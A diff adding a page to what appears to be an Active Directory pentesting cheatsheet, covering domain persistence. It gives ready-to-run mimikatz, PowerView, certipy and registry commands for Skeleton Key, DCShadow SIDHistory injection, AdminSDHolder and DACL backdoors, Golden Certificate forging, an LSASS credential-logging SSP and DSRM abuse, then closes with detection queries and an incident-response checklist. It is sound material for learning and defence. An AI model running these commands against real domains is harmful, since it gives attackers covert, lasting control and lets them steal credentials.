@@ -1,0 +1,338 @@
+---
+title: "Part 8: Persistence & Post-Exploitation"
+description: "Maintaining access after domain compromise — Skeleton Key, DCShadow, AdminSDHolder backdoor, certificate persistence, SID history, and more."
+category: Methodology
+subcategory: Active Directory Attack
+order: 8
+tags: ["active-directory", "persistence", "post-exploitation", "dcshadow", "pentesting"]
+updated: 2026-04-11
+---
+
+# Part 8: Persistence & Post-Exploitation
+
+You've compromised the domain. Now what? Persistence techniques ensure you maintain access even after passwords are rotated, systems are patched, or incident response begins. These techniques range from modifying AD objects to patching Domain Controller memory.
+
+---
+
+## Skeleton Key
+
+**Severity:** 🔴 Critical
+
+Patches LSASS memory on a Domain Controller to accept a **master password** for any account, while still allowing normal passwords to work. Users don't notice anything — authentication works as normal, but the attacker has a universal backdoor.
+
+### Deployment
+
+```powershell
+# Default skeleton key password: "mimikatz"
+mimikatz "privilege::debug" "misc::skeleton"
+
+# Now authenticate as ANY user with password "mimikatz"
+# Their normal password also still works
+
+# Remote connection
+psexec.py domain.local/administrator:'mimikatz'@dc01.domain.local
+```
+
+### Limitations
+
+- **Non-persistent:** Cleared on DC reboot
+- Must be re-injected after each restart
+- Only works on the DC where it's injected (not replicated)
+- Detected by Credential Guard
+
+### Persistent Variant (Overpass-the-DC)
+
+For persistence across reboots, use a kernel driver to patch LSASS at startup:
+
+```powershell
+# Using mimikatz skeleton with patch on disk (requires SYSTEM)
+mimikatz "misc::skeleton /patch"
+```
+
+---
+
+## DCShadow
+
+**Severity:** 🔴 Critical
+
+Registers a **rogue Domain Controller** in Active Directory and pushes malicious replication changes that are absorbed by legitimate DCs. The changes appear as normal replication — extremely stealthy.
+
+### Requirements
+
+- Domain Admin or SYSTEM on a domain-joined machine
+- DA credentials for pushing changes
+
+### Attack Flow
+
+```powershell
+# Terminal 1: Register rogue DC and stage changes (requires SYSTEM)
+mimikatz "lsadump::dcshadow /object:targetuser /attribute:SIDHistory /value:S-1-5-21-PARENT-519"
+
+# Terminal 2: Push the changes (requires DA)
+mimikatz "lsadump::dcshadow /push"
+```
+
+### What You Can Modify
+
+| Target | Attribute | Effect |
+|---|---|---|
+| User object | `SIDHistory` | Add Enterprise Admin SID → instant forest admin |
+| User object | `primaryGroupID` | Change primary group to Domain Admins (512) |
+| Computer object | `msDS-AllowedToActOnBehalfOfOtherIdentity` | Set up RBCD |
+| Any object | `servicePrincipalName` | Set SPNs for Kerberoasting |
+| User object | `userAccountControl` | Disable pre-auth for AS-REP roast |
+| GPO object | Various | Modify GPO settings |
+
+### Example: Add SIDHistory for Persistence
+
+```powershell
+# Add Enterprise Admins SID to a sleeper account
+mimikatz "lsadump::dcshadow /object:sleeper_account /attribute:SIDHistory /value:S-1-5-21-XXXX-519"
+mimikatz "lsadump::dcshadow /push"
+
+# sleeper_account now has Enterprise Admin rights via SID history
+# This survives password resets and persists across the forest
+```
+
+---
+
+## AdminSDHolder Backdoor
+
+**Severity:** 🟠 High
+
+The `AdminSDHolder` container has a special security descriptor that is applied to all protected groups (Domain Admins, Enterprise Admins, Administrators, etc.) every **60 minutes** by the SDProp process. If you modify the AdminSDHolder ACL, your changes are automatically pushed to every protected object.
+
+### Setup
+
+```powershell
+# Add a backdoor ACE to AdminSDHolder
+Add-DomainObjectAcl \
+  -TargetIdentity "CN=AdminSDHolder,CN=System,DC=domain,DC=local" \
+  -PrincipalIdentity backdoor_user \
+  -Rights All
+
+# After 60 minutes (or force SDProp), backdoor_user has GenericAll on:
+# - Domain Admins
+# - Enterprise Admins
+# - Administrators
+# - Schema Admins
+# - Account Operators
+# - Backup Operators
+# - Server Operators
+# etc.
+```
+
+### Force SDProp (Faster)
+
+```powershell
+# Trigger SDProp immediately
+Invoke-ADSDPropagation
+
+# Or via registry
+# HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters
+# Set "AdminSDProtectFrequency" = 60 (seconds)
+```
+
+### Exploitation After SDProp Runs
+
+```powershell
+# backdoor_user now has full control over Domain Admins
+# Reset DA password, add yourself, etc.
+Add-DomainGroupMember -Identity "Domain Admins" -Members backdoor_user
+```
+
+---
+
+## Certificate Persistence
+
+**Severity:** 🔴 Critical
+
+Certificates are one of the most powerful persistence mechanisms because they survive password resets, are valid for long periods (1 year+ by default), and are difficult to revoke in practice.
+
+### Request a Persistent Certificate
+
+```bash
+# Enroll a certificate as the compromised admin
+certipy req -u admin@domain.local -p pass \
+  -ca YOURCA -template User
+
+# This certificate is valid for 1 year by default
+# Even if the admin's password is changed, the cert still works
+
+# Authenticate anytime within the validity period
+certipy auth -pfx admin.pfx -dc-ip DC_IP
+# Returns NT hash → PtH, DCSync, etc.
+```
+
+### Forge Certificates (Golden Certificate)
+
+If you compromise the **CA private key**, you can forge certificates for any user indefinitely:
+
+```bash
+# Extract CA private key (requires admin on CA server)
+certipy ca -backup -u admin@domain.local -p pass -ca YOURCA
+
+# Forge a certificate for any user
+certipy forge -ca-pfx ca.pfx -upn administrator@domain.local \
+  -subject "CN=Administrator,CN=Users,DC=domain,DC=local"
+
+# Authenticate
+certipy auth -pfx forged_admin.pfx -dc-ip DC_IP
+```
+
+> 💡 **Golden Certificate** is the certificate equivalent of a Golden Ticket. The only remediation is to revoke and re-issue the CA certificate — which means re-issuing every certificate in the environment.
+
+---
+
+## Custom SSP (Security Support Provider)
+
+Load a custom SSP DLL into LSASS to log cleartext credentials as users authenticate:
+
+```powershell
+# Copy mimilib.dll to System32
+copy mimilib.dll C:\Windows\System32\
+
+# Register as SSP via registry
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "Security Packages" /t REG_MULTI_SZ /d "kerberos\0msv1_0\0schannel\0wdigest\0tspkg\0pku2u\0mimilib" /f
+
+# Or inject without reboot
+mimikatz "misc::memssp"
+
+# Credentials logged to: C:\Windows\System32\kiwissp.log
+```
+
+---
+
+## DSRM (Directory Services Restore Mode) Abuse
+
+Every DC has a local DSRM administrator account with a password set during DC promotion. This account can be used for persistence if the DSRM logon behavior is changed:
+
+```powershell
+# Dump DSRM password hash
+mimikatz "lsadump::lsa /patch" | findstr "DSRM"
+# or
+mimikatz "token::elevate" "lsadump::sam"
+
+# Enable network logon for DSRM account
+reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
+
+# Now PtH with the DSRM hash
+psexec.py -hashes :DSRM_HASH .\Administrator@dc01
+```
+
+---
+
+## Security Descriptor Modification (DACL Backdoor)
+
+Add hidden ACEs to critical objects for long-term access:
+
+```powershell
+# DCSync rights (persists until manually cleaned)
+Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=local" \
+  -PrincipalIdentity backdoor_user -Rights DCSync
+
+# Full control on all users (reset any password, set any attribute)
+Add-DomainObjectAcl -TargetIdentity "OU=Users,DC=domain,DC=local" \
+  -PrincipalIdentity backdoor_user -Rights All
+
+# These ACEs are hard to spot without regular ACL auditing
+```
+
+---
+
+## Machine Account Persistence
+
+Computer accounts have passwords that rotate every 30 days by default, but you can:
+
+```powershell
+# Disable machine account password rotation
+reg add "HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters" \
+  /v "DisablePasswordChange" /t REG_DWORD /d 1 /f
+
+# The current machine hash remains valid indefinitely
+# Use for Silver Tickets, RBCD, etc.
+```
+
+---
+
+## Persistence Summary Matrix
+
+| Technique | Survives Password Reset? | Survives Reboot? | Detection Difficulty | Remediation |
+|---|---|---|---|---|
+| **Golden Ticket** | ✅ Yes | ✅ Yes | Medium | Reset krbtgt twice |
+| **Diamond Ticket** | ✅ Yes | ✅ Yes | Hard | Reset krbtgt twice |
+| **Silver Ticket** | ✅ (service acct) | ✅ Yes | Hard | Reset service account |
+| **Skeleton Key** | N/A | ❌ No | Medium | Reboot DC + Credential Guard |
+| **DCShadow** | ✅ Yes | ✅ Yes | Hard | Audit + revert changes |
+| **AdminSDHolder** | ✅ Yes | ✅ Yes | Medium | Clean AdminSDHolder ACL |
+| **Certificate** | ✅ Yes | ✅ Yes | Hard | Revoke cert |
+| **Golden Certificate** | ✅ Yes | ✅ Yes | Very Hard | Re-issue CA |
+| **Custom SSP** | N/A | ⚠️ Registry | Medium | Remove DLL + registry |
+| **DSRM** | ✅ Yes | ✅ Yes | Medium | Change DSRM password |
+| **DACL Backdoor** | ✅ Yes | ✅ Yes | Hard | Full ACL audit |
+
+---
+
+## Incident Response Checklist
+
+If you suspect AD compromise, here's the priority order:
+
+1. **Reset krbtgt password TWICE** (12-24 hours apart) — invalidates all Golden/Diamond Tickets
+2. **Revoke suspicious certificates** and audit all issued certs
+3. **Audit AdminSDHolder ACL** and clean any unauthorized ACEs
+4. **Check for DCShadow artifacts** — rogue DC objects in AD
+5. **Scan for rogue SPNs** on user accounts
+6. **Audit SIDHistory** on all accounts — remove unauthorized entries
+7. **Check DSRM logon behavior** registry key on all DCs
+8. **Verify machine account password rotation** is enabled
+9. **Re-baseline all GPOs** and SYSVOL contents
+10. **Full ACL audit** of privileged objects (Domain Admins, Enterprise Admins, DC OU)
+11. **Enable Credential Guard** on all DCs
+12. **Review CA configuration** — check for ESC6 flag, template permissions
+
+---
+
+## Defense & Detection
+
+### Monitoring
+
+| Event ID | What It Catches |
+|---|---|
+| **4742** | Computer account modified (DCShadow — rogue DC registration) |
+| **4662** | Directory service access (DCSync, AdminSDHolder modification) |
+| **5136** | Directory object modified (SIDHistory, ACL changes) |
+| **4706** | New trust created |
+| **4887** | Certificate issued (unexpected enrollment) |
+| **4697** | Service installed (SSP loading) |
+| **7045** | New service installed (persistence indicators) |
+
+### Tools for Detection
+
+```bash
+# Check for rogue DCs
+Get-ADComputer -Filter {userAccountControl -band 8192}
+
+# Audit SIDHistory
+Get-ADUser -Filter {SIDHistory -like "*"} -Properties SIDHistory
+
+# Check AdminSDHolder ACL
+(Get-Acl "AD:CN=AdminSDHolder,CN=System,DC=domain,DC=local").Access | 
+  ? {$_.IdentityReference -notmatch "BUILTIN|NT AUTHORITY|Domain Admins|Enterprise Admins"}
+
+# Check DSRM behavior
+Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DsrmAdminLogonBehavior
+```
+
+&nbsp;
+
+&nbsp;
+
+---
+
+> **This concludes the Active Directory Attack Cheatsheet series.** For authorized testing only. Stay ethical, stay curious.
+
+&nbsp;
+
+## Related Writeups
+
+*Writeups that put these techniques into practice will be linked here.*
